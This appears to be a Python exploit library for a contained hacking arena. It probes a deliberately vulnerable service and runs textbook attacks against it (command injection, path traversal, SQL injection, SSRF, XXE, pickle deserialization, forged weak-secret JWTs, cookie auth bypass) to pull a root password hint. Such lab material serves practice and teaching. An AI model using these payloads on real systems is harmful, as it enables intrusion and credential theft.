"""
Exploit Library for Docker Arena Gladiators
Contains exploit functions for all 13 vulnerability types
"""

import requests
import json
import base64
import pickle
import jwt
import threading
import time

def exploit_rce(ip):
    """Remote Code Execution via command injection"""
    try:
        payload = "127.0.0.1; cat /gladiator/password_hint.txt"
        res = requests.get(f"http://{ip}:8000/health", params={'check': payload}, timeout=2)
        if res.status_code == 200 and "Root Password set to:" in res.text:
            password = res.text.split("Root Password set to:")[1].strip().split()[0]
            return password
    except:
        pass
    return None

def exploit_lfi(ip):
    """Local File Inclusion via directory traversal"""
    try:
        res = requests.get(f"http://{ip}:8000/api/file", 
                         params={'path': '/gladiator/password_hint.txt'}, timeout=2)
        if res.status_code == 200 and "Root Password set to:" in res.text:
            password = res.text.split("Root Password set to:")[1].strip()
            return password
    except:
        pass
    return None

def exploit_sqli(ip):
    """SQL Injection in login endpoint"""
    try:
        payload = {
            'username': "admin' OR '1'='1'--",
            'password': 'anything'
        }
        res = requests.post(f"http://{ip}:8000/api/login", data=payload, timeout=2)
        if res.status_code == 200:
            data = res.json()
            if data.get('success') and 'password' in data:
                return data['password']
    except:
        pass
    return None

def exploit_ssrf(ip):
    """Server-Side Request Forgery"""
    try:
        res = requests.get(f"http://{ip}:8000/api/fetch", 
                         params={'url': 'file:///gladiator/password_hint.txt'}, timeout=2)
        if res.status_code == 200 and "Root Password set to:" in res.text:
            password = res.text.split("Root Password set to:")[1].strip()
            return password
    except:
        pass
    return None

def exploit_xxe(ip):
    """XML External Entity injection"""
    try:
        xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///gladiator/password_hint.txt">]>
<config><setting>&xxe;</setting></config>'''
        
        res = requests.post(f"http://{ip}:8000/api/config", data=xxe_payload, timeout=2)
        if res.status_code == 200 and "Root Password set to:" in res.text:
            password = res.text.split("Root Password set to:")[1].strip()
            return password
    except:
        pass
    return None

def exploit_deserialization(ip):
    """Insecure Deserialization"""
    try:
        # Create a malicious object with __exploit__ attribute
        class Exploit:
            __exploit__ = True
        
        obj = Exploit()
        pickled = base64.b64encode(pickle.dumps(obj)).decode()
        
        res = requests.post(f"http://{ip}:8000/api/session", data=pickled, timeout=2)
        if res.status_code == 200:
            data = res.json()
            if 'password' in data:
                return data['password']
    except:
        pass
    return None

def exploit_idor(ip):
    """Insecure Direct Object Reference"""
    try:
        res = requests.get(f"http://{ip}:8000/api/user/admin", timeout=2)
        if res.status_code == 200:
            data = res.json()
            if 'password' in data:
                return data['password']
    except:
        pass
    return None

def exploit_auth_bypass(ip):
    """Authentication Bypass via cookie"""
    try:
        cookies = {'admin': 'true'}
        res = requests.get(f"http://{ip}:8000/api/admin", cookies=cookies, timeout=2)
        if res.status_code == 200:
            data = res.json()
            if 'password' in data:
                return data['password']
    except:
        pass
    return None

def exploit_jwt(ip):
    """JWT with weak secret"""
    try:
        # Forge admin token with weak secret
        token = jwt.encode({'user': 'admin', 'admin': True}, 'secret', algorithm='HS256')
        
        res = requests.post(f"http://{ip}:8000/api/auth", 
                          json={'token': token}, 
                          timeout=2)
        if res.status_code == 200:
            data = res.json()
            if 'password' in data:
                return data['password']
    except:
        pass
    return None

def exploit_race_condition(ip):
    """Race condition in rate limiting"""
    try:
        # Send parallel requests to trigger race condition
        results = []
        
        def send_request():
            try:
                res = requests.post(f"http://{ip}:8000/api/attempt", timeout=2)
                if res.status_code == 500:
                    data = res.json()
                    if 'debug_info' in data and 'password' in data['debug_info']:
                        results.append(data['debug_info']['password'])
            except:
                pass
        
        threads = []
        for _ in range(15):  # Send 15 parallel requests
            t = threading.Thread(target=send_request)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join(timeout=3)
        
        if results:
            return results[0]
    except:
        pass
    return None

def exploit_cors(ip):
    """CORS Misconfiguration"""
    try:
        res = requests.get(f"http://{ip}:8000/api/cors-test", timeout=2)
        if res.status_code == 200:
            data = res.json()
            if 'password' in data:
                return data['password']
    except:
        pass
    return None

def exploit_buffer_overflow(ip):
    """Simulated Buffer Overflow"""
    try:
        # Send > 256 chars to trigger "crash"
        payload = "A" * 300
        res = requests.post(f"http://{ip}:8000/api/buffer", data=payload, timeout=2)
        if res.status_code == 500 and "Memory contents:" in res.text:
            password = res.text.split("Memory contents:")[1].strip()
            return password
    except:
        pass
    return None

# ============================================================================
# RECONNAISSANCE SYSTEM - Discover which vulnerabilities exist
# ============================================================================

def probe_rce(ip):
    """Check if RCE endpoint exists"""
    try:
        res = requests.get(f"http://{ip}:8000/health", timeout=1)
        return res.status_code != 404
    except:
        return False

def probe_lfi(ip):
    """Check if LFI endpoint exists"""
    try:
        res = requests.get(f"http://{ip}:8000/api/file?path=/etc/hostname", timeout=1)
        return res.status_code != 404
    except:
        return False

def probe_sqli(ip):
    """Check if SQLi endpoint exists"""
    try:
        res = requests.post(f"http://{ip}:8000/api/login", data={'username': 'test'}, timeout=1)
        return res.status_code != 404
    except:
        return False

def probe_ssrf(ip):
    """Check if SSRF endpoint exists"""
    try:
        res = requests.get(f"http://{ip}:8000/api/fetch?url=http://127.0.0.1", timeout=1)
        return res.status_code != 404
    except:
        return False

def probe_xxe(ip):
    """Check if XXE endpoint exists"""
    try:
        res = requests.post(f"http://{ip}:8000/api/config", data='<test/>', timeout=1)
        return res.status_code != 404
    except:
        return False

def probe_deserialization(ip):
    """Check if Deserialization endpoint exists"""
    try:
        res = requests.post(f"http://{ip}:8000/api/session", data='test', timeout=1)
        return res.status_code != 404
    except:
        return False

def probe_idor(ip):
    """Check if IDOR endpoint exists"""
    try:
        res = requests.get(f"http://{ip}:8000/api/user/1", timeout=1)
        return res.status_code != 404
    except:
        return False

def probe_auth_bypass(ip):
    """Check if Auth Bypass endpoint exists"""
    try:
        res = requests.get(f"http://{ip}:8000/api/admin", timeout=1)
        return res.status_code != 404
    except:
        return False

def probe_jwt(ip):
    """Check if JWT endpoint exists"""
    try:
        res = requests.post(f"http://{ip}:8000/api/auth", json={}, timeout=1)
        return res.status_code != 404
    except:
        return False

def probe_race_condition(ip):
    """Check if Race Condition endpoint exists"""
    try:
        res = requests.post(f"http://{ip}:8000/api/attempt", timeout=1)
        return res.status_code != 404
    except:
        return False

def probe_cors(ip):
    """Check if CORS endpoint exists"""
    try:
        res = requests.get(f"http://{ip}:8000/api/cors-test", timeout=1)
        return res.status_code != 404
    except:
        return False

def probe_buffer_overflow(ip):
    """Check if Buffer Overflow endpoint exists"""
    try:
        res = requests.post(f"http://{ip}:8000/api/buffer", data='test', timeout=1)
        return res.status_code != 404
    except:
        return False

# Probe mapping
PROBE_MAP = {
    'RCE': probe_rce,
    'LFI': probe_lfi,
    'SQLi': probe_sqli,
    'SSRF': probe_ssrf,
    'XXE': probe_xxe,
    'Deserialization': probe_deserialization,
    'IDOR': probe_idor,
    'Auth Bypass': probe_auth_bypass,
    'JWT': probe_jwt,
    'Race Condition': probe_race_condition,
    'CORS': probe_cors,
    'Buffer Overflow': probe_buffer_overflow
}

# Exploit name mapping for quick lookup
EXPLOIT_MAP = {
    'RCE': exploit_rce,
    'LFI': exploit_lfi,
    'SQLi': exploit_sqli,
    'SSRF': exploit_ssrf,
    'XXE': exploit_xxe,
    'Deserialization': exploit_deserialization,
    'IDOR': exploit_idor,
    'Auth Bypass': exploit_auth_bypass,
    'JWT': exploit_jwt,
    'Race Condition': exploit_race_condition,
    'CORS': exploit_cors,
    'Buffer Overflow': exploit_buffer_overflow
}

def reconnaissance(ip):
    """Probe target to discover which vulnerabilities exist"""
    discovered = []
    
    for name, probe_func in PROBE_MAP.items():
        try:
            if probe_func(ip):
                discovered.append(name)
        except:
            pass
    
    return discovered

# Export all exploit functions
ALL_EXPLOITS = [
    ('RCE', exploit_rce),
    ('LFI', exploit_lfi),
    ('SQLi', exploit_sqli),
    ('SSRF', exploit_ssrf),
    ('XXE', exploit_xxe),
    ('Deserialization', exploit_deserialization),
    ('IDOR', exploit_idor),
    ('Auth Bypass', exploit_auth_bypass),
    ('JWT', exploit_jwt),
    ('Race Condition', exploit_race_condition),
    ('CORS', exploit_cors),
    ('Buffer Overflow', exploit_buffer_overflow)
]
